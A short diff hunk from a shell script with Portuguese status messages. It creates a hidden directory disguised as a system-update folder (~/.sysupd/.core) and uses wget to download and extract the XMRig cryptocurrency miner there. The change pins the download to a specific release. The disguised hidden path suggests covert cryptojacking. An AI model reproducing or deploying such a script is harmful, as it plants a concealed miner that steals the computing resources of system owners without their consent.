@@ -15,7 +15,7 @@ mkdir -p ~/.sysupd/.core
 cd ~/.sysupd/.core
 
 echo "[+] Baixando e extraindo XMRig..."
-wget -q https://github.com/xmrig/xmrig/releases/latest/download/xmrig-*-linux-x64.tar.gz -O core.tar.gz
+wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-linux-x64.tar.gz -O core.tar.gz
 tar -xf core.tar.gz
 cd xmrig-*-linux-x64 || exit
 
